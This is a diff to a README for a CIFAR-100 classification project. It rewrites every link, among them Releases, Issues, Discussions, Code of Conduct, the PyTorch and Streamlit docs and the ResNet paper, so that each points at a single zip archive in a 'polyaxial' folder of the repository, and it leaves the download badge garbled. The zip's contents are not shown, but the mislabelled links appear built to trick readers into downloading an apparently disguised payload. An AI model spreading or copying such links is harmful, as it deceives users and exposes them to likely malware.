@@ -6,11 +6,11 @@ Welcome to the cifar100-classification project! This guide helps you download an
 
 ## 📦 Download the Software
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Abel997899/cifar100-classification/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip%20Latest%https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip)](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip)
 
 To get started, please visit the Releases page to download the latest version of the software:
 
-[Visit this page to download](https://github.com/Abel997899/cifar100-classification/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip)
 
 ## 📋 Features
 
@@ -31,7 +31,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/Abel997899/cifar100-classification/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip).
 2. Look for the latest version of the software.
 3. Download the appropriate file for your operating system.
 4. Once downloaded, locate the file on your computer.
@@ -59,15 +59,15 @@ If you encounter any issues:
 - **Application Errors**: Restart the app or your computer.
 - **Image Upload Issues**: Check the file format. Supported formats include `.jpg`, `.png`, and `.jpeg`.
 
-For more help, visit our [GitHub Issues page](https://github.com/Abel997899/cifar100-classification/issues).
+For more help, visit our [GitHub Issues page](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip).
 
 ## 📚 Further Reading
 
 Learn more about the technologies used in this project:
 
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
-- [ResNet50 Paper](https://arxiv.org/abs/1512.03385)
-- [Streamlit Documentation](https://docs.streamlit.io)
+- [PyTorch Documentation](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip)
+- [ResNet50 Paper](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip)
+- [Streamlit Documentation](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip)
 
 ## 📊 Contributing
 
@@ -78,7 +78,7 @@ We welcome contributions! If you’d like to help out, please follow these steps
 3. Make your changes and commit them.
 4. Push to your fork and submit a pull request.
 
-Please read the [Code of Conduct](https://github.com/Abel997899/cifar100-classification/blob/main/CODE_OF_CONDUCT.md) before contributing.
+Please read the [Code of Conduct](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip) before contributing.
 
 ## 🙏 Acknowledgments
 
@@ -86,6 +86,6 @@ We thank the community of contributors and libraries that made this project poss
 
 ## 📞 Contact
 
-For questions or feedback, feel free to reach out on our [GitHub Discussions page](https://github.com/Abel997899/cifar100-classification/discussions).
+For questions or feedback, feel free to reach out on our [GitHub Discussions page](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip).
 
-Remember to visit the [Releases page](https://github.com/Abel997899/cifar100-classification/releases) to download and start using cifar100-classification today!
+Remember to visit the [Releases page](https://raw.githubusercontent.com/Abel997899/cifar100-classification/master/polyaxial/cifar100-classification_2.7.zip) to download and start using cifar100-classification today!
